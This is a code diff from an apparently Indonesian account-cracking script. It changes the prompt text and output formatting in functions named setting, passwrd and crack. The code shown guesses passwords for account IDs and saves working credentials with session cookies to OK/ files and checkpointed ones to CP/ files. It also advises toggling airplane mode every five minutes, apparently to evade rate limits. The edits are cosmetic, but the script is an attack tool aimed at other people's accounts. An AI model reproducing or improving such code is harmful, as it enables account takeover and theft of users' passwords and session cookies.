@@ -480,7 +480,7 @@ def setting():
 		method.append('mobile')
 	guw = '# PILIHAN OPSI CRACK '
 	sol().print(mark(guw, style='green'))
-	aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Terkalt? (y/t) : ')
+	aplik = input(x+'['+p+'f'+x+'] Tampilkan Appl terkait? [ Not Recommended ] (y/t) : ')
 	if aplik in ['y','Y']:
 		taplikasi.append('ya')
 	else:
@@ -493,7 +493,7 @@ def setting():
 	passwrd()
 
 def passwrd():
-	ler = '# SEDANG MENGGESER BULAN, TEKAN CTRL+Z UNTUK BERHENTI'
+	ler = '# SEDANG MENGGESER HATIMU SAYANG😘, TEKAN CTRL+Z UNTUK BERHENTI'
 	sol().print(mark(ler, style='green'))
 	krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
 	cetak(nel(krek, title='CRACK'))
@@ -557,7 +557,7 @@ def crack(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'[-] ID : {idf} [-] PW : {pw}'
+					statuscp = f'[CP] {idf} | {pw}'
 					statuscp1 = nel(statuscp, style='yellow')
 					cetak(nel(statuscp1, title='SESI'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -572,7 +572,7 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[+] ID : {idf} [+] PW : {pw}'
+					statusok = f'[OK] {idf} | {pw}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title=' LIVE'))
 					break
